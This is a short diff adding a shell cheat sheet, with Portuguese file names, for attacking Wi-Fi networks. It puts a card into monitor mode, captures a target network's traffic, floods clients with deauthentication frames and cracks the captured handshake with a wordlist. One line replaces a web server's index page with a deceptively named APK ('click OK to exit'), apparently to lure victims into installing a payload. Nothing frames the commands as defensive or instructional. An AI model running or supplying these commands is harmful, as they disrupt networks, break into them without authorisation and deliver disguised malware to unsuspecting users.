@@ -1,0 +1,8 @@
+airmon-ng check kill | airmon-ng start wlan0
+airodump-ng mon0 -w arquivo | airodump-ng mon0 --bssid  --channel 
+aireplay-ng --deauth 10000 -a  -c  mon0
+aireplay-ng --deauth 10000 -a 
+rm /var/www/html/index.html | mv /root/Desktop/101_CLICK-OK-PARA-SAIR.apk /var/www/html/ | chmod 777 101_CLICK-OK-PARA-SAIR.apk | cd /var/www/html/ | service apache2 restart
+cd /root/Desktop
+service apache2 restart
+aircrack-ng -w MACS+.txt alvo10-01.cap
